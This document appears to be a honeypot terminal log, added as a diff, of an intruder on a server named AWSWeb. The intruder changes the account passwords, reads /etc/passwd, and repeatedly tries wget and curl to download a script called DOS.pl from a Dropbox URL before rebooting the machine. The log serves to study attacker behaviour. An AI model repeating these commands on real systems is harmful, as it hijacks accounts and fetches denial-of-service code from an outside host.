@@ -1,0 +1,229 @@
+[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# c[1D[1Pcd
+[4l[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# cd /
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      
+selinux    tmp        proc       sbin       etc        dev        srv        
+initrd.img lib        home       var        usr        boot       root       
+lost+found 
+[4hAWSWeb:/# cd var
+[4l[4hAWSWeb:/var# c[1D[1Pls
+[4lbackups run     mail    cache   log     opt     tmp     local   lib     lock    
+spool   
+[4hAWSWeb:/var# cd[1D[1P[1D[1Pcd home
+[4lbash: cd: home: No such file or directory
+[4hAWSWeb:/var# /c[1D[1Phome
+bash: /home: command not found
+AWSWeb:/var# cd /home
+[4l[4hAWSWeb:/home# ls
+[4lrichard 
+[4hAWSWeb:/home# cd richard
+[4l[4hAWSWeb:/home/richard# ls
+[4l[4hAWSWeb:/home/richard# su[1D[1P[1D[1Ppasswd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:/home/richard# su
+[4l[4hAWSWeb:/home/richard# su richard
+[4l[4hAWSWeb:/home/richard# passwd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:/home/richard# ls
+[4l[4hAWSWeb:/home/richard# ls
+[4l[4hAWSWeb:/home/richard# cd[1D[1P[1D[1Pwget https://dl.dropbox.com/u/6826053/Scripts/DOS.pl
+[4lSorry, SSL not supported in this release
+[4hAWSWeb:/home/richard# apt-get install wget
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  wget 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 770.2kB of archives.
+After this operation, 1694.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main wget 1.16-2 [770.2kB]
+Fetched 770.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking wget (from .../archives/wget_1.16-2_i386.deb) ...
+Processing triggers for man-db ...
+Setting up wget (1.16-2) ...
+[4hAWSWeb:/home/richard# [Kapt-get install wget[20D[Kwget https://dl.dropbox.com/u/6826053/Scripts/DOS.pl
+[4lwget: Segmentation fault
+[4hAWSWeb:/home/richard# [Kwget https://dl.dropbox.com/u/6826053/Scripts/DOS.pl
+[4lwget: Segmentation fault
+[4hAWSWeb:/home/richard# curl https://dl.dropbox.com/u/6826053/Scripts/DOS.pl
+bash: curl: command not found
+AWSWeb:/home/richard# [Kcurl https://dl.dropbox.com/u/6826053/Scripts/DOS.pl[52D[Kwget https://dl.dropbox.com/u/6826053/Scripts/DOS.pl[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1P
+[4lwget: Segmentation fault
+[4hAWSWeb:/home/richard# c[1D[1Papt-get install perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  perl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 302.2kB of archives.
+After this operation, 664.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main perl 1.11-5 [302.2kB]
+Fetched 302.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking perl (from .../archives/perl_1.11-5_i386.deb) ...
+Processing triggers for man-db ...
+Setting up perl (1.11-5) ...
+[4hAWSWeb:/home/richard# ap-tge[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pt[1D[1Ppt-get rm wget
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/home/richard# su
+[4l[4hAWSWeb:/home/richard# [Ksu[2D[Kapt-get rm wget
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/home/richard# su root
+[4l[4hAWSWeb:/home/richard# [Ksu root[7D[Kapt-get rm wget
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/home/richard# cat /etc/passwd |grep "/bin/bash" |grep "[5-9][0-9][0-9]" |cut -d: -f1
+[4lroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+richard:x:1000:1000:richard,,,:/home/richard:/bin/bash
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+cat: |grep: No such file or directory
+cat: /bin/bash: No such file or directory
+cat: |grep: No such file or directory
+cat: [5-9][0-9][0-9]: No such file or directory
+cat: |cut: No such file or directory
+cat: -d:: No such file or directory
+cat: -f1: No such file or directory
+[4hAWSWeb:/home/richard# cat /etc/passwd
+[4lroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+richard:x:1000:1000:richard,,,:/home/richard:/bin/bash
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+[4hAWSWeb:/home/richard# su root
+[4l[4hAWSWeb:/home/richard# [Ksu root[7D[Kcat /etc/passwd[15D[Kcat /etc/passwd |grep "/bin/bash" |grep "[5-9][0-9][0-9]" |cut -d: -f1[70D[Kapt-get rm wget[15D[Ksu root[7D[Kapt-get rm wget[15D[Ksu[2D[Kapt-get rm wget[15D[Kapt-get install perl[20D[Kapt-get rm wget[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Premove[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pemove wget
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/home/richard# su richard
+[4l[4hAWSWeb:/home/richard# ls
+[4l[4hAWSWeb:/home/richard# su root
+[4l[4hAWSWeb:/home/richard# [Ksu root[7D[Kls[2D[Ksu richard[10D[Kapt-get remove wget[19D[Ksu root[7D[Kapt-get remove wget
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/home/richard# \[1D[1Pwget
+[4lwget: Segmentation fault
+[4hAWSWeb:/home/richard# w[1D[1Papt-[1D[1Pitude
+bash: aptitude: command not found
+AWSWeb:/home/richard# c[1D[1Papt-get install curl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  curl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 222.2kB of archives.
+After this operation, 488.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main curl 1.6-3 [222.2kB]
+Fetched 222.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking curl (from .../archives/curl_1.6-3_i386.deb) ...
+Processing triggers for man-db ...
+Setting up curl (1.6-3) ...
+[4hAWSWeb:/home/richard# [Kapt-get install curl[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Ptall dos2unix
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  dos2unix 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 884.2kB of archives.
+After this operation, 1944.8kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main dos2unix 0.19-8 [884.2kB]
+Fetched 884.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking dos2unix (from .../archives/dos2unix_0.19-8_i386.deb) ...
+Processing triggers for man-db ...
+Setting up dos2unix (0.19-8) ...
+[4hAWSWeb:/home/richard# [Kapt-get install dos2unix[24D[Kapt-get install curl[20D[Kaptitude[8D[Kwget[1D[1P[1D[1P[1D[1P[1D[1Pcurl https://dl.dropbox.com/u/6826053/Scripts/DOS.pl
+[4lcurl: Segmentation fault
+[4hAWSWeb:/home/richard# c[1D[1P[Kcurl https://dl.dropbox.com/u/6826053/Scripts/DOS.pl[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[1C[1C[1C[1C[1D[1P
+[4lcurl: Segmentation fault
+[4hAWSWeb:/home/richard# apt-get upgra[1D[1P[1D[1P[1D[1Pdate
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/home/richard# cd
+[4l[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# su richard
+[4l[4hAWSWeb:~# [Ksu richard[10D[Kls[2D[Kcd[2D[Kapt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:~# c[1D[1Psudo apt-get remove wget
+bash: sudo: command not found
+AWSWeb:~# [Ksudo apt-get remove wget[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Papt-get install sudo
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  sudo 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 254.2kB of archives.
+After this operation, 558.8kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main sudo 0.34-8 [254.2kB]
+Fetched 254.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking sudo (from .../archives/sudo_0.34-8_i386.deb) ...
+Processing triggers for man-db ...
+Setting up sudo (0.34-8) ...
+[4hAWSWeb:~# [Kapt-get install sudo[20D[Ksudo apt-get remove wget
+[4lsudo: Segmentation fault
+[4hAWSWeb:~# c[1D[1Preboot
+[4l
+Broadcast message from root@AWSWeb (pts/0) (Tue Feb 26 01:36:41 2013):
+
+The system is going down for reboot NOW!
+Connection to server closed.
+[4hlocalhost:~# 
